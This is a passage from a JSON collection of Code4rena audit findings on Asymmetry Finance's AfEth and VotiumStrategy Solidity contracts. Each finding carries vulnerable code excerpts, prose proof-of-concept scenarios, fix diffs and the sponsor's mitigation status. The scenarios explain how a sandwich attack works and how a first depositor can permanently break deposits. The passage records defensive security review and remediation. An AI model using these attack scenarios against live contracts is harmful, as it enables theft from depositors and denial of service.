IERC20(CVX_ADDRESS).balanceOf(address(this))`. This should be enough to cover the requested amount by the user.\n4.  The implementation continues to search through the `lockedBalances`, but since this array is empty the for loop is never executed.\n5.  The function reaches the end and is reverted with a `InvalidLockedAmount()` error.\n\n### Recommendation\n\nBefore searching through the `lockedBalances` array, check if there available unlocked tokens are enough to cover the withdrawal. If so, the withdrawal can be set for the current epoch. This will fix the unnecessary delay and the potential denial of service.\n\n```diff\n    function requestWithdraw(\n        uint256 _amount\n    ) public override returns (uint256 withdrawId) {\n        latestWithdrawId++;\n        uint256 _priceInCvx = cvxPerVotium();\n\n        _burn(msg.sender, _amount);\n\n        uint256 currentEpoch = ILockedCvx(VLCVX_ADDRESS).findEpochId(\n            block.timestamp\n        );\n        (\n            ,\n            uint256 unlockable,\n            ,\n            ILockedCvx.LockedBalance[] memory lockedBalances\n        ) = ILockedCvx(VLCVX_ADDRESS).lockedBalances(address(this));\n        uint256 cvxAmount = (_amount * _priceInCvx) / 1e18;\n        cvxUnlockObligations += cvxAmount;\n\n        uint256 totalLockedBalancePlusUnlockable = unlockable +\n            IERC20(CVX_ADDRESS).balanceOf(address(this));\n        \n+       if (totalLockedBalancePlusUnlockable >= amount) {\n+           withdrawIdToWithdrawRequestInfo[\n+               latestWithdrawId\n+           ] = WithdrawRequestInfo({\n+               cvxOwed: cvxAmount,\n+               withdrawn: false,\n+               epoch: currentEpoch,\n+               owner: msg.sender\n+           });\n+           emit WithdrawRequest(msg.sender, cvxAmount, latestWithdrawId);\n+           return latestWithdrawId;\n+       }\n\n        for (uint256 i = 0; i < lockedBalances.length; i++) {\n            totalLockedBalancePlusUnlockable += lockedBalances[i].amount;\n            // we found the epoch at which there is enough to unlock this position\n            if (totalLockedBalancePlusUnlockable >= cvxUnlockObligations) {\n                (, uint32 currentEpochStartingTime) = ILockedCvx(VLCVX_ADDRESS)\n                    .epochs(currentEpoch);\n                uint256 timeDifference = lockedBalances[i].unlockTime -\n                    currentEpochStartingTime;\n                uint256 epochOffset = timeDifference /\n                    ILockedCvx(VLCVX_ADDRESS).rewardsDuration();\n                uint256 withdrawEpoch = currentEpoch + epochOffset;\n                withdrawIdToWithdrawRequestInfo[\n                    latestWithdrawId\n                ] = WithdrawRequestInfo({\n                    cvxOwed: cvxAmount,\n                    withdrawn: false,\n                    epoch: withdrawEpoch,\n                    owner: msg.sender\n                });\n\n                emit WithdrawRequest(msg.sender, cvxAmount, latestWithdrawId);\n                return latestWithdrawId;\n            }\n        }\n        // should never get here\n        revert InvalidLockedAmount();\n    }\n```\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/49#issuecomment-1746416854):**\n > It seems pretty severe that `requestWithdraw()` would fail when the `lockedBalances` array is empty right?\n\n**[elmutt (Asymmetry) confirmed and commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/49#issuecomment-1749259495):**\n > @0xleastwood - Absolutely agree. We are working on a fix to address this issue.\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/49#issuecomment-1752018144):**\n > I think this DoS is recoverable. If all locks are unlocked/expired, then it will not be possible to request a withdrawal. However, if `relock()` is called, then additional requests to withdraw can be processed and the final impact is that the request is delayed more than it needs to be.\n>\n> It's not possible to prevent withdrawal finalisation by calling `relock()` first either because `cvxUnlockObligations` is used to reserve cvx that is owed to existing withdrawal requests.\n>\n> I think I will leave it as-is unless there is a way to brick funds by preventing users from finalising their withdrawals.\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-10-asymmetry-mitigation#mitigations-to-be-reviewed):**\n >\tCheck if available amount to withdraw is already in contract.\n\n**Status**: Mitigation confirmed. Full details in reports from [adriro](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/37) and [d3e4](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/19).\n\n***\n\n",
      "summary": "\nThe VotiumStrategy contract has a feature where users can request to withdraw their funds, but this feature has some issues. The contract does not consider the case where there are already enough unlocked funds to cover the withdrawal, which can lead to delays and even a denial of service. This means that users may have to wait longer than necessary to withdraw their funds, or in some cases, may not be able to withdraw at all. The team has confirmed this issue and is working on a fix. In the meantime, they have implemented a mitigation to prevent this issue from happening.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/49",
      "tags": [],
      "finders": [
        "d3e4",
        "MiloTruck",
        "1",
        "2",
        "adriro",
        "m\\_Rassska"
      ]
    },
    {
      "id": "29991",
      "title": "[M-03] Forced relock in VotiumStrategy withdrawal causes denial of service if Convex locking contract is shutdown",
      "impact": "MEDIUM",
      "content": "\nThe VotiumStrategy withdrawal process involves relocking CVX tokens, which can potentially lead to a denial of service and loss of user funds if the underlying vlCVX contract is shutdown.\n\n### Impact\n\nWhen withdrawals are executed in VotiumStrategy, the implementation of `withdraw()` will call `relock()` in order to relock any available excess (i.e. expired tokens minus the pending obligations) of CVX tokens to lock them again in the Convex protocol.\n\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategy.sol#L135-L149>\n\n```solidity\n135:     function relock() public {\n136:         (, uint256 unlockable, , ) = ILockedCvx(VLCVX_ADDRESS).lockedBalances(\n137:             address(this)\n138:         );\n139:         if (unlockable > 0)\n140:             ILockedCvx(VLCVX_ADDRESS).processExpiredLocks(false);\n141:         uint256 cvxBalance = IERC20(CVX_ADDRESS).balanceOf(address(this));\n142:         uint256 cvxAmountToRelock = cvxBalance > cvxUnlockObligations\n143:             ? cvxBalance - cvxUnlockObligations\n144:             : 0;\n145:         if (cvxAmountToRelock > 0) {\n146:             IERC20(CVX_ADDRESS).approve(VLCVX_ADDRESS, cvxAmountToRelock);\n147:             ILockedCvx(VLCVX_ADDRESS).lock(address(this), cvxAmountToRelock, 0);\n148:         }\n149:     }\n```\n\nThis seems fine at first, but if we dig into the implementation of `lock()` we can see that the preconditions of this function requires the contract not to be shutdown:\n\n<https://etherscan.io/address/0x72a19342e8F1838460eBFCCEf09F6585e32db86E#code#L1469>\n\n```solidity\n521:     function _lock(address _account, uint256 _amount, uint256 _spendRatio, bool _isRelock) internal {\n522:         require(_amount > 0, \"Cannot stake 0\");\n523:         require(_spendRatio <= maximumBoostPayment, \"over max spend\");\n524:         require(!isShutdown, \"shutdown\");\n```\n\nWhich means that any call to `lock()` after the contract is shutdown will revert. This is particularly bad because `relock()` is called as part of the withdraw process. If the vlCVX contract is shutdown, VotiumStrategy depositors won't be able to withdraw their position, causing a potential loss of funds.\n\nNote that this also will cause a DoS while depositing rewards, since `depositRewards()` in VotiumStrategy also calls `ILockedCvx::lock()`.\n\n### Proof of Concept\n\n1.  vlCVX contract is shutdown.\n2.  A user requests a withdrawal using `requestWithdrawal()`\n3.  The user calls `withdraw()` when the withdrawal epoch is reached.\n4.  The implementation will call `relock()`, which will call `ILockedCvx::lock()`.\n5.  The implementation of `lock()` will throw an error because the vault is already shutdown.\n6.  The transaction will be reverted.\n\n### Recommendation\n\nAdd a condition to check if the contract is shutdown to avoid the call to `lock()` and the potential denial of service.\n\n```diff\n    function relock() public {\n        (, uint256 unlockable, , ) = ILockedCvx(VLCVX_ADDRESS).lockedBalances(\n            address(this)\n        );\n        if (unlockable > 0)\n            ILockedCvx(VLCVX_ADDRESS).processExpiredLocks(false);\n        uint256 cvxBalance = IERC20(CVX_ADDRESS).balanceOf(address(this));\n        uint256 cvxAmountToRelock = cvxBalance > cvxUnlockObligations\n            ? cvxBalance - cvxUnlockObligations\n            : 0;\n-       if (cvxAmountToRelock > 0) {\n+       if (cvxAmountToRelock > 0 && !ILockedCvx(VLCVX_ADDRESS).isShutdown()) {\n            IERC20(CVX_ADDRESS).approve(VLCVX_ADDRESS, cvxAmountToRelock);\n            ILockedCvx(VLCVX_ADDRESS).lock(address(this), cvxAmountToRelock, 0);\n        }\n    }\n```\n\n**[elmutt (Asymmetry) confirmed](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/50#issuecomment-1741384749)**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-10-asymmetry-mitigation#mitigations-to-be-reviewed):**\n > Check if vlcvx contract is shutdown before trying to relock.\n\n**Status**: Mitigation confirmed. Full details in reports from [m\\_Rassska](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/18) and [adriro](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/36).\n\n***\n\n",
      "summary": "\nThe VotiumStrategy withdrawal process involves relocking CVX tokens, which can potentially lead to a denial of service and loss of user funds if the underlying vlCVX contract is shutdown. This means that if the vlCVX contract is shutdown, users will not be able to withdraw their funds, resulting in a potential loss of funds. The issue is caused by a call to `lock()` in the `relock()` function, which can only be executed if the contract is not shutdown. To prevent this, a condition should be added to check if the contract is shutdown before attempting to relock the tokens. This bug has been confirmed and mitigated by the Asymmetry team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/50",
      "tags": [],
      "finders": [
        "adriro",
        "MiloTruck"
      ]
    },
    {
      "id": "29990",
      "title": "[M-02] Swap functionality to sell rewards is too permissive and could cause accidental or intentional loss of value",
      "impact": "MEDIUM",
      "content": "\nWhile the intention is to use the 0x protocol to sell rewards, the implementation doesn't provide any basic guarantee this will correctly happen and grants the rewarder arbitrary control over the tokens held by the strategy.\n\n### Impact\n\nRewards earned in the VotingStrategy contract are exchanged for ETH and deposited back into the protocol. As indicated by the documentation, the intention is to swap these rewards for ETH using the 0x protocol:\n\n> Votium rewards are claimed with claimRewards() using merkle proofs published by votium every 2 weeks. applyRewards() sells rewards on 0x and deposits them back into afEth (and ultimately back into the safEth & votium strategies), making the afEth price go up.\n\nHowever, the implementation of `applyRewards()` shallowly executes a series of calls to arbitrary targets:\n\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L272-L305>\n\n```solidity\n272:     function applyRewards(SwapData[] calldata _swapsData) public onlyRewarder {\n273:         uint256 ethBalanceBefore = address(this).balance;\n274:         for (uint256 i = 0; i < _swapsData.length; i++) {\n275:             // Some tokens do not allow approval if allowance already exists\n276:             uint256 allowance = IERC20(_swapsData[i].sellToken).allowance(\n277:                 address(this),\n278:                 address(_swapsData[i].spender)\n279:             );\n280:             if (allowance != type(uint256).max) {\n281:                 if (allowance > 0) {\n282:                     IERC20(_swapsData[i].sellToken).approve(\n283:                         address(_swapsData[i].spender),\n284:                         0\n285:                     );\n286:                 }\n287:                 IERC20(_swapsData[i].sellToken).approve(\n288:                     address(_swapsData[i].spender),\n289:                     type(uint256).max\n290:                 );\n291:             }\n292:             (bool success, ) = _swapsData[i].swapTarget.call(\n293:                 _swapsData[i].swapCallData\n294:             );\n295:             if (!success) {\n296:                 emit FailedToSell(_swapsData[i].sellToken);\n297:             }\n298:         }\n299:         uint256 ethBalanceAfter = address(this).balance;\n300:         uint256 ethReceived = ethBalanceAfter - ethBalanceBefore;\n301: \n302:         if (address(manager) != address(0))\n303:             IAfEth(manager).depositRewards{value: ethReceived}(ethReceived);\n304:         else depositRewards(ethReceived);\n305:     }\n```\n\nThis not only fails to provide any guarantee that 0x will be used (and that it will be used correctly), but grants a lot of power to the rewarder which can be used accidentally or purposely to negatively impact the protocol. The rewarded role can grant any token approval to any spender and execute arbitrary calls on behalf of the VotingStrategy.\n\n### Recommendation\n\nProvide better guarantees in the implementation of `applyRewards()` that 0x will be used to swap rewards, to ensure a more transparent and less error prone solution.\n\n*   Instead of granting arbitrary allowance to any spender, set this to the 0x entrypoint.\n*   Change arbitrary calls to the 0x protocol entrypoint.\n*   Data sent to the 0x contract could also be validated, for example to ensure the output token is ETH.\n\n**[Asymmetry acknowledged](https://github.com/code-423n4/2023-10-asymmetry-mitigation?tab=readme-ov-file#out-of-scope)**\n\n\n***\n\n",
      "summary": "\nThe report highlights an issue with the implementation of the Votium Strategy contract, which is used to sell rewards for ETH using the 0x protocol. However, the current implementation does not provide any guarantees that this will happen correctly and gives the rewarder too much control over the tokens held by the strategy. This can potentially be used to harm the protocol. The report recommends making changes to the implementation to ensure that 0x is used correctly and to validate the data sent to the 0x contract. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/54",
      "tags": [],
      "finders": [
        "d3e4",
        "adriro"
      ]
    },
    {
      "id": "29989",
      "title": "[M-01] AfEth collaterals cannot be balanced after ratio is changed",
      "impact": "MEDIUM",
      "content": "\nThe AfEth ratio between the collaterals can be modified but there is no direct way to balance the assets to follow the new ratio.\n\n### Impact\n\nThe AfEth contract contains a configurable parameter `ratio` that indicates the intended balance between the two collaterals, SafEth and the Votium strategy. For example, a value of `3e17` means that 30% of the TVL should go to SafEth, and 70% should go to Votium.\n\nThis ratio is followed when new deposits are made. The deposited ETH is splitted according to the ratio and channeled in proportion to each collateral. The ratio is also checked when rewards are deposited to direct them to the proper collateral.\n\nThe ratio can also be modified by the admins of the protocol using the `setRatio()` function.\n\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L90-L92>\n\n```solidity\n90:     function setRatio(uint256 _newRatio) public onlyOwner {\n91:         ratio = _newRatio;\n92:     }\n```\n\nHowever, there is no way to balance the assets once a new ratio is defined. The implementation will need to rely on new deposits and reward compounding to slowly correct the offset, which may take a lot of time and may be impractical for most cases.\n\n### Proof of Concept\n\nLet's assume the protocol is deployed with a ratio of `3e17`.\n\n1.  Deposits follow the configured ratio and split the TVL in 30% for SafEth and 70% for Votium.\n2.  At some point, the protocol decides to switch to 50%-50% and sets a new ratio of `5e17`.\n3.  New deposits will follow the new ratio and split 50% for each collateral, but these have potentially accumulated a large amount of TVL with the previous split. The existing difference will continue, new deposits can't correct this offset.\n\n### Recommendation\n\nSimilar to how it is done in SafEth, the AfEth contract could have a rebalancing function which withdraws the proper amount from one collateral and deposits it in the other collateral, in order to correct the offset and target the new configured ratio. This function should be admin controlled, and support slippage control to correctly handle potentially large amounts of swaps.\n\nAn alternative could be to also correct a potential deviation in the ratio using new deposits. This could help speed up the correction by not only relying on rewards, but will also endure a delay in the convergence.\n\n**[elmutt (Asymmetry) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/55#issuecomment-1747051030):**\n > It's hard to rebalance because of the locked convex. We have discussed this internally and consider it an acceptable risk for now so im acknowledging this issue instead of confirming.\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/55#issuecomment-1751706361):**\n > In this instance, the implementation of the ratio mechanism with respect to rebalancing between `vEth` and `safEth` is a design decision that has flaws and potentially needs to be redesigned. However, the warden has identified that the current implementation does not enforce the ratio as what might be expected from users. For example, once the ratio has been changed, it takes some time for this to be fully in effect and as a result, users may be depositing into the protocol with the expectation of some ratio but that isn't what is currently in place. Performing instant rebalances is a design decision done by `safEth` so maybe this is the right way to be consistent? Even if users are potentially retroactively affected, provided the delay is sufficient, users should be able to exit the protocol if they do not agree with the new ratio.\n> \n> For these reasons, I would still like to keep this issue as medium severity because I think this mechanism is ultimately flawed and can be realistically improved. My decision is final on this.\n\n\n***\n\n",
      "summary": "\nThe AfEth contract has a configurable parameter called \"ratio\" that determines the balance between two collaterals, SafEth and Votium. However, once the ratio is changed, there is no way to balance the assets to follow the new ratio. This means that new deposits and rewards will not be directed to the proper collateral, potentially causing a large offset. The report recommends implementing a rebalancing function to correct this issue, but the project team has acknowledged the problem and considers it an acceptable risk for now. The judge has also acknowledged the flaw but has decided to keep the issue as medium severity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/55",
      "tags": [],
      "finders": [
        "adriro"
      ]
    },
    {
      "id": "29988",
      "title": "[H-05] Functions in the `VotiumStrategy` contract are susceptible to sandwich attacks",
      "impact": "HIGH",
      "content": "\nIn `VotiumStrategyCore.sol`, the `buyCvx()` and `sellCvx()` functions call `exchange_underlying()` of Curve's ETH / CVX pool to buy and sell CVX respectively:\n\n[VotiumStrategyCore.sol#L233-L240](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L233-L240)\n\n```solidity\n        ICrvEthPool(CVX_ETH_CRV_POOL_ADDRESS).exchange_underlying{\n            value: _ethAmountIn\n        }(\n            0,\n            1,\n            _ethAmountIn,\n            0 // this is handled at the afEth level\n        );\n```\n\n[VotiumStrategyCore.sol#L258-L263](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L258-L263)\n\n```solidity\n        ICrvEthPool(CVX_ETH_CRV_POOL_ADDRESS).exchange_underlying(\n            1,\n            0,\n            _cvxAmountIn,\n            0 // this is handled at the afEth level\n        );\n```\n\nAs seen from above, `exchange_underlying()` is called with its `_min_dy` parameter as 0, which means the minimum amount of CVX or ETH to receive from the swap is effectively 0.\n\nThis isn't an issue when users interact with the `AfEth` contract, as its [`deposit()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L143-L169) and [`withdraw()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L238-L265) functions include a `_minOut` parameter which protects against slippage.\n\nHowever, users that interact with the `VotiumStrategy` contract directly will not be protected from slippage when they call any of the following functions:\n\n*   [`deposit()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategy.sol#L35-L46), which calls `buyCvx()`\n*   [`depositRewards()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L199-L208), which calls `buyCvx()`\n*   [`withdraw()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategy.sol#L105-L129), which calls `sellCvx()`\n\nShould users call any of the functions listed above directly, they will be susceptible to sandwich attacks by attackers, which would reduce the amount of CVX or ETH received from the swap with curve's pool.\n\n### Impact\n\nDue to a lack of slippage protection in `buyCvx()` and `sellCvx()`, users that interact with the `VotiumStrategy` contract will be susceptible to sandwich attacks. This results in a loss of funds for them as they will receive less CVX or ETH for the same amount of funds.\n\n### Proof of Concept\n\nConsider the following scenario:\n\n*   Bob calls the `VotiumStrategy` contract's `deposit()` function directly to deposit ETH.\n*   Alice sees his transaction in the mempool and front-runs his transaction. She swaps a large amount of ETH into the Curve pool and gets CVX in return.\n*   Now, Bob's transaction is executed:\n    *   `buyCvx()` attempts to swap Bob's ETH deposit for CVX.\n    *   However, since the pool currently has a lot more ETH than CVX, Bob only gets a small amount of CVX in return.\n*   Alice back-runs Bob's transaction and swaps the CVX she gained for ETH in the pool, which would result in a profit for her.\n\nIn this scenario, Alice has sandwiched Bob's `deposit()` transaction for a profit, causing Bob to receive less CVX for his deposited ETH.\n\n### Recommended Mitigation\n\nConsider adding a `_minOut` parameter to either `buyCvx()` and `sellCvx()`, or the following functions:\n\n*   [`deposit()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategy.sol#L35-L46)\n*   [`depositRewards()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L199-L208)\n*   [`withdraw()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategy.sol#L105-L129)\n\nThis allows the caller to specify a minimum amount they expect from the swap, which would protect them from slippage.\n\n**[elmutt (Asymmetry) confirmed and commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/23#issuecomment-1738271917):**\n > @toshiSat - I think we should just lock this down so afEth can only use votium strategy.\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/23#issuecomment-1746323875):**\n > Marking this as primary issue and best report because it addresses all edge cases where slippage should be checked.\n\n**[elmutt (Asymmetry) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/23#issuecomment-1747218944):**\n> In order fully solve it and issues marked as duplicates x([\\#24](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/24), [\\#61](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/61), [\\#15](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/15)) we also need to pass \\_minout to afEth.applyRewards() :\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/23#issuecomment-1747452519):**\n > @elmutt - Agree with you on this.\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-10-asymmetry-mitigation#mitigations-to-be-reviewed):**\n > For this one we locked down the depositRewards function and added a minout to the reward functions.\n\n**Status**: Mitigation confirmed. Full details in reports from [d3e4](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/16) and [adriro](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/32).\n\n***\n\n \n",
      "summary": "\nThe VotiumStrategyCore.sol contract has two functions, buyCvx() and sellCvx(), which use the exchange_underlying() function from Curve's ETH / CVX pool to buy and sell CVX. However, these functions do not have a minimum output parameter set, which means that users who interact directly with the VotiumStrategy contract could be vulnerable to sandwich attacks. In these attacks, another user can front-run the transaction and manipulate the pool to receive more CVX or ETH, resulting in a loss for the original user. To mitigate this issue, it is recommended to add a minimum output parameter to the buyCvx() and sellCvx() functions, or to the deposit(), depositRewards(), and withdraw() functions that call them. The Asymmetry team has confirmed and mitigated this issue by adding a minimum output parameter to the depositRewards() function.",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/23",
      "tags": [],
      "finders": [
        "d3e4",
        "MiloTruck",
        "1",
        "2",
        "rvierdiiev",
        "m\\_Rassska"
      ]
    },
    {
      "id": "29987",
      "title": "[H-04] `price()` in `AfEth.sol` doesn't take afEth held for pending withdrawals into account",
      "impact": "HIGH",
      "content": "\nIn `AfEth.sol`, the `price()` function returns the current price of afEth:\n\n[AfEth.sol#L133-L141](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L133-L141)\n\n```solidity\n    function price() public view returns (uint256) {\n        if (totalSupply() == 0) return 1e18;\n        AbstractStrategy vEthStrategy = AbstractStrategy(vEthAddress);\n        uint256 safEthValueInEth = (ISafEth(SAF_ETH_ADDRESS).approxPrice(true) *\n            safEthBalanceMinusPending()) / 1e18;\n        uint256 vEthValueInEth = (vEthStrategy.price() *\n            vEthStrategy.balanceOf(address(this))) / 1e18;\n        return ((vEthValueInEth + safEthValueInEth) * 1e18) / totalSupply();\n    }\n```\n\nAs seen from above, the price of afEth is calculated by the TVL of both safEth and vAfEth divided by `totalSupply()`. However, this calculation does not take into account afEth that is transferred to the contract when `requestWithdraw()` is called:\n\n[AfEth.sol#L183-L187](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L183-L187)\n\n```solidity\n        uint256 afEthBalance = balanceOf(address(this));\n        uint256 withdrawRatio = (_amount * 1e18) /\n            (totalSupply() - afEthBalance);\n\n        _transfer(msg.sender, address(this), _amount);\n```\n\nWhen a user calls `requestWithdraw()` to initiate a withdrawal, his afEth is transferred to the `AfEth` contract as shown above. Afterwards, an amount of [vAfEth proportional to his withdrawal amount is burned](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategy.sol#L54-L60), and [`pendingSafEthWithdraws` is increased](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L199).\n\nWhen `price()` is called afterwards, `safEthBalanceMinusPending()` and `vEthStrategy.balanceOf(address(this))` will be decreased. However, since the user's afEth is only transferred and not burnt, `totalSupply()` remains the same. This causes the value returned by `price()` to be lower than what it should be, since `totalSupply()` is larger than the actual circulating supply of afEth.\n\nThis is an issue as `deposit()` relies on `price()` to determine how much afEth to mint to a depositor:\n\n[AfEth.sol#L166-L168](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L166-L168)\n\n```solidity\n        uint256 amountToMint = totalValue / priceBeforeDeposit;\n        if (amountToMint < _minout) revert BelowMinOut();\n        _mint(msg.sender, amountToMint);\n```\n\nWhere:\n\n*   `totalValue` is the ETH value of the caller's deposit.\n*   `priceBeforeDeposit` is the cached value of `price()`.\n\nIf anyone has initiated a withdrawal using `requestWithdraw()` but hasn't called `withdraw()` to withdraw his funds, `price()` will be lower than what it should be. Subsequently, when `deposit()` is called, the depositor will receive more afEth than he should since `priceBeforeDeposit` is smaller.\n\nFurthermore, a first depositor can call `requestWithdraw()` with all his afEth immediately after staking to make `price()` return 0, thereby permanently DOSing all future deposits as `deposit()` will always revert with a division by zero error.\n\n### Impact\n\nWhen there are pending withdrawals, `price()` will return a value smaller than its actual value. This causes depositors to receive more afEth than intended when calling `deposit()`, resulting in a loss of funds for previous depositors.\n\nAdditionally, a first depositor can abuse this to force `deposit()` to always revert, permanently bricking the protocol forever.\n\n### Proof of Concept\n\nAssume that the protocol is newly deployed and Alice is the only depositor.\n\n*   This means that Alice's afEth balance equals to `totalSupply()`.\n\nAlice calls `requestWithdraw()` with `_amount` as all her afEth:\n\n*   Since `_amount == totalSupply()`, `withdrawRatio` is `1e18` (100%).\n*   Therefore, all of the protocol's vAfEth is burnt and `pendingSafEthWithdraws` is increased to the protocol's safEth balance.\n*   Alice's afEth is transferred to the protocol.\n\nBob calls `deposit()` to deposit some ETH into the protocol:\n\n*   When `price()` is called:\n    *   Since `pendingSafEthWithdraws` is equal to the protocol's safEth balance, `safEthBalanceMinusPending()` is 0, therefore `safEthValueInEth` is also 0.\n    *   Since `vEthStrategy.balanceOf(address(this))` (the protocol's vAfEth balance) is 0, `vEthValueInEth` is also 0.\n    *   `totalSupply()` is non-zero.\n    *   Therefore, `price()` returns 0 as:\n\n```\n\n    ((vEthValueInEth + safEthValueInEth) * 1e18) / totalSupply() = ((0 + 0) * 1e18) / x = 0\n```\n\n*   As `priceBeforeDeposit` is 0, [this line](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L166) reverts with a division by zero error.\n\nAs demonstrated above, `deposit()` will always revert as long as Alice does not call `withdraw()` to burn her afEth, thereby bricking the protocol's core functionality.\n\n### Recommended Mitigation\n\nIn `price()`, consider subtracting the amount of afEth held in the contract from `totalSupply()`:\n\n[AfEth.sol#L133-L141](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L133-L141)\n\n```diff\n    function price() public view returns (uint256) {\n-       if (totalSupply() == 0) return 1e18;\n+       uint256 circulatingSupply = totalSupply() - balanceOf(address(this));\n+       if (circulatingSupply == 0) return 1e18;\n        AbstractStrategy vEthStrategy = AbstractStrategy(vEthAddress);\n        uint256 safEthValueInEth = (ISafEth(SAF_ETH_ADDRESS).approxPrice(true) *\n            safEthBalanceMinusPending()) / 1e18;\n        uint256 vEthValueInEth = (vEthStrategy.price() *\n            vEthStrategy.balanceOf(address(this))) / 1e18;\n-       return ((vEthValueInEth + safEthValueInEth) * 1e18) / totalSupply();\n+       return ((vEthValueInEth + safEthValueInEth) * 1e18) / circulatingSupply;\n    }\n```\n\n**[elmutt (Asymmetry) confirmed and commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/25#issuecomment-1741058078):**\n > @toshiSat - I think we can solve this by burning the tokens in requestWithdraw.\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-10-asymmetry-mitigation#mitigations-to-be-reviewed):**\n > For this one we made afEth just burn on requestWithdraw.\n\n**Status**: Mitigation confirmed. Full details in reports from [m\\_Rassska](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/7), [d3e4](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/15), and [adriro](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/31).\n\n***\n\n",
      "summary": "\nThe `AfEth.sol` contract has a bug that affects the price calculation of afEth tokens. This is because when a user calls the `requestWithdraw()` function to initiate a withdrawal, their afEth tokens are transferred to the contract without being burned. This causes the `totalSupply()` of afEth to remain the same, even though the actual circulating supply is lower. This leads to an incorrect value being returned by the `price()` function, which is used to determine how much afEth to mint for depositors. This can result in depositors receiving more afEth than intended and can also be exploited to permanently disable the protocol. To fix this, the amount of afEth held in the contract should be subtracted from the `totalSupply()` in the `price()` function. Asymmetry has confirmed and mitigated this issue by burning afEth tokens when `requestWithdraw()` is called.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/25",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "MiloTruck",
        "1",
        "2",
        "adriro"
      ]
    },
    {
      "id": "29986",
      "title": "[H-03] AfEth deposits could use price data from an invalid Chainlink response",
      "impact": "HIGH",
